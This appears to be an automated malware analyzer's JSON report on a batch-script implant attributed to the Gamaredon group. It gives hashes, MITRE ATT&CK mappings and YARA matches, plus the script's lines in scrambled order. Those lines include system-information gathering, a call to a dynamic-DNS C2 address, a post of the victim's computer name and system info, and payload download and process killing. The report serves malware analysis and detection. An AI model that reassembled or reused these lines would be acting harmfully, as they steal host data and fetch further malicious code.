{"Details": {"Properties": {"Name": "x_gamaredongroup_x_pteranodonimplant.bin", "md5": "49b4a1123ff61b6a9c8229886cdd8e12", "sha1": "d6b75d46dd3e2823189c1e30519e474879996b08", "sha256": "eaea6643415acfed0e741dcb608d99c8e6f8828c462360f43098adc982c7e93e", "ssdeep": "48:urLr7YS3uUCL9mvo5yV1L/+Z/2LOcPu2b6L84qHN8mrKOm+zarYbFHm/eApk6t:EAUQ9m7V1D+hUJVboFAN8zoaE9mlpkq", "size": "2.17KB", "bytes": "2225", "mime": "text/x-msdos-batch", "extension": "application/octet-stream", "Entropy": "5.513149813436039 (Minimum: 0.0, Maximum: 8.0)"}}, "Location": {"Original": "/analyzer/folders/malware/x_GamaredonGroup_x_PteranodonImplant.bin", "File": "/analyzer/folders/output/b14e22fa-cc14-4b78-aa39-1bfe54fb7570_49b4a1123ff61b6a9c8229886cdd8e12/temp", "html": "/analyzer/folders/output/b14e22fa-cc14-4b78-aa39-1bfe54fb7570_49b4a1123ff61b6a9c8229886cdd8e12/x_GamaredonGroup_x_PteranodonImplant.bin.html", "json": "/analyzer/folders/output/b14e22fa-cc14-4b78-aa39-1bfe54fb7570_49b4a1123ff61b6a9c8229886cdd8e12/x_GamaredonGroup_x_PteranodonImplant.bin.json", "Folder": "/analyzer/folders/output/b14e22fa-cc14-4b78-aa39-1bfe54fb7570_49b4a1123ff61b6a9c8229886cdd8e12/temp_unpacked"}, "Encoding": {"Details": {"charset": "us-ascii", "ForceEncoding": "utf-8", "ByteOrderMark": "None"}}, "Behavior": {"Intell": [{"Matched": "1", "Required": "1", "Behavior": "Terminate process", "Detected": "kill "}]}, "Language": {"UnKnown": [{"Count": "Unavailable", "Word": "if not errorlevel 1 taskkill /f /im %cqhuz%"}, {"Count": "Unavailable", "Word": "start /b %cqhuz% --post-data=\"versiya=%vers%&comp=%computername%&id=%cgvfw%&sysinfo=%infosys%&fid=000000\" \"%bhvhl%\" -q -n %bhvhl% -o %xidio%"}, {"Count": "Unavailable", "Word": "set hdcpw=drop-news"}, {"Count": "Unavailable", "Word": "set xidio=byxox"}, {"Count": "Unavailable", "Word": "if %errorlevel% == 0 ("}, {"Count": "Unavailable", "Word": "ver | find /i \"%kbdrk%\""}, {"Count": "Unavailable", "Word": "if %tqdlr%==is ("}, {"Count": "Unavailable", "Word": "systeminfo>pagyd"}, {"Count": "Unavailable", "Word": ":byxox"}, {"Count": "Unavailable", "Word": "call oigdj.cmd %ihnax% %eomkn% %vjaky% %xidio%"}, {"Count": "Unavailable", "Word": "timeout /t %ihnax%"}, {"Count": "Unavailable", "Word": "set cgvfw=%cgvfw: =%"}, {"Count": "Unavailable", "Word": "') do set /a dbehn=%%a"}, {"Count": "Unavailable", "Word": "set /a ihnax=50*%random%/32768"}, {"Count": "Unavailable", "Word": "timeout /2"}, {"Count": "Unavailable", "Word": "goto cpsws"}, {"Count": "Unavailable", "Word": "set picdfig=%date%"}, {"Count": "Unavailable", "Word": "for /f \"skip=1 tokens=5*\" %%m in ('vol c:') do set tqdlr=%%m"}, {"Count": "Unavailable", "Word": ":cpsws"}, {"Count": "Unavailable", "Word": "for /f \"tokens=*\" %%f in (pagyd) do @if not z%%f==z set infosys=!infosys!%%f+###"}, {"Count": "Unavailable", "Word": "set vers=v.74"}, {"Count": "Unavailable", "Word": "if %dbehn% geq 2 goto exit"}, {"Count": "Unavailable", "Word": "set vboqebf=%systemroot%"}, {"Count": "Unavailable", "Word": "set sbhiipk=%random%"}, {"Count": "Unavailable", "Word": "@echo off"}, {"Count": "Unavailable", "Word": "set kbdrk=xp"}, {"Count": "Unavailable", "Word": "rename \"%xidio%\" %vjaky%.tmp"}, {"Count": "Unavailable", "Word": "set cqhuz=officemodule.exe"}, {"Count": "Unavailable", "Word": "tasklist /nh /fi \"imagename eq %vjaky%.exe\" ^| find /c \"%vjaky%.exe\""}, {"Count": "Unavailable", "Word": "tasklist /fi \"imagename eq %cqhuz%\" | find /i \"%cqhuz%\""}, {"Count": "Unavailable", "Word": "setlocal enabledelayedexpansion"}, {"Count": "Unavailable", "Word": "set vboqebf=%appdata%"}, {"Count": "Unavailable", "Word": ":oigdj"}, {"Count": "Unavailable", "Word": "timeout /t 10"}, {"Count": "Unavailable", "Word": "set vjaky=cryptcp"}, {"Count": "Unavailable", "Word": "set cgvfw=%computername%_%tqdlr:-=%"}, {"Count": "Unavailable", "Word": "for %%t in (%xidio%) do (set /a oukky=%%~zt)"}, {"Count": "Unavailable", "Word": "set akdih=ddns.net"}, {"Count": "Unavailable", "Word": "if %userprofile%==budfnin set mcorbrj=%computername%"}, {"Count": "Unavailable", "Word": "set eomkn=%windir%\\microsoft\\crypto\\rsa"}, {"Count": "Unavailable", "Word": "set ryjic=updates.php"}, {"Count": "Unavailable", "Word": "set eomkn=%appdata%\\microsoft\\crypto\\rsa"}, {"Count": "Unavailable", "Word": "for /f %%a in ('"}, {"Count": "Unavailable", "Word": "for /f \"skip=1 tokens=4*\" %%n in ('vol c:') do set tqdlr=%%n"}, {"Count": "Unavailable", "Word": "rename \"updates.cmd\" oigdj.cmd"}, {"Count": "Unavailable", "Word": "if %oukky% leq 60000 goto oigdj"}, {"Count": "Unavailable", "Word": "set bhvhl=http://%hdcpw%.%akdih%/%ryjic%"}]}, "Patterns": {"LINKS": [{"Count": "1", "Link": "ddns.net", "Description": ""}], "HEX": [{"Count": "1", "HEX": "000000", "Parsed": "\u0000\u0000\u0000"}]}, "Suspicious": {"Strings": [{"Count": "1", "Detected": "set vjaky=cryptcp"}, {"Count": "1", "Detected": "set eomkn=%appdata%\\microsoft\\crypto\\rsa"}, {"Count": "1", "Detected": "set eomkn=%windir%\\microsoft\\crypto\\rsa"}, {"Count": "4", "Detected": "if %userprofile%==budfnin set mcorbrj=%computername%"}, {"Count": "1", "Detected": "if %errorlevel% == 0 ("}, {"Count": "1", "Detected": "if %tqdlr%==is ("}, {"Count": "1", "Detected": "for /f \"tokens=*\" %%f in (pagyd) do @if not z%%f==z set infosys=!infosys!%%f+###"}, {"Count": "1", "Detected": "set bhvhl=http://%hdcpw%.%akdih%/%ryjic%"}]}, "URLs": {"URLs": [{"Distance": "2", "URL": "ddns.net", "Similar": "adnxs.net"}, {"Distance": "2", "URL": "ddns.net", "Similar": "ecdns.net"}]}, "Creds": {"Logins": [{"Count": "4", "UserPass": "userprofile%==budfnin set mcorbrj=%computername%\n"}]}, "QBDETECT": {"Detection": [{"Count": "6", "Offset": "Unavailable", "Rule": "API Alert", "Match": "system", "Parsed": "None"}]}, "MITRE": {"Attack": [{"Id": "t1007", "Name": "System Service Discovery", "Detected": "tasklist", "Description": "Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using [Tasklist](https://attack.mitre.org/software/S0057), and \"net start\" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well."}, {"Id": "t1033", "Name": "System Owner/User Discovery", "Detected": "systeminfo", "Description": "### Windows\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.\n\n### Mac\n\nOn Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.\n\n### Linux\n\nOn Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>."}, {"Id": "t1038", "Name": "DLL Search Order Hijacking", "Detected": "%systemroot%", "Description": "Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace."}, {"Id": "t1057", "Name": "Process Discovery", "Detected": "tasklist", "Description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.\n\n### Windows\n\nAn example command that would obtain details on processes is \"tasklist\" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.\n\n### Mac and Linux\n\nIn Mac and Linux, this is accomplished with the <code>ps</code> command."}, {"Id": "t1082", "Name": "System Information Discovery", "Detected": "ver ,systeminfo", "Description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.\n\n### Windows\n\nExample commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.\n\n### Mac\n\nOn Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions."}, {"Id": "t1083", "Name": "File and Directory Discovery", "Detected": "find ", "Description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. \n\n### Windows\n\nExample utilities used to obtain this information are <code>dir</code> and <code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.\n\n### Mac and Linux\n\nIn Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands."}, {"Id": "t1089", "Name": "Disabling Security Tools", "Detected": "taskkill", "Description": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting."}, {"Id": "t1129", "Name": "Execution through Module Load", "Detected": "%systemroot%", "Description": "The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)\n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via <code>&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries can use this functionality as a way to execute arbitrary code on a system."}]}, "Yara": {"Matches": [{"Count": "0", "Offset": "0x6b1", "Rule": "Top1000Passwords", "Patteren": "000000", "Parsed": "None", "Condition": "any of them"}, {"Count": "3", "Offset": "0x6a 0x15d 0x365 0x4f9", "Rule": "Top1000Passwords", "Patteren": "COMPUTER", "Parsed": "None", "Condition": "any of them"}, {"Count": "1", "Offset": "0x3ad 0x682", "Rule": "Top1000Passwords", "Patteren": "computer", "Parsed": "None", "Condition": "any of them"}, {"Count": "3", "Offset": "0x6b1 0x6b2 0x6b3 0x78d", "Rule": "Top1000Passwords", "Patteren": "0000", "Parsed": "None", "Condition": "any of them"}, {"Count": "1", "Offset": "0x6b1 0x6b2", "Rule": "Top1000Passwords", "Patteren": "00000", "Parsed": "None", "Condition": "any of them"}, {"Count": "0", "Offset": "0x64f", "Rule": "Top1000Passwords", "Patteren": "star", "Parsed": "None", "Condition": "any of them"}, {"Count": "5", "Offset": "0x17 0x380 0x403 0x527 0x851 0x89a", "Rule": "Top1000Passwords", "Patteren": "system", "Parsed": "None", "Condition": "any of them"}]}}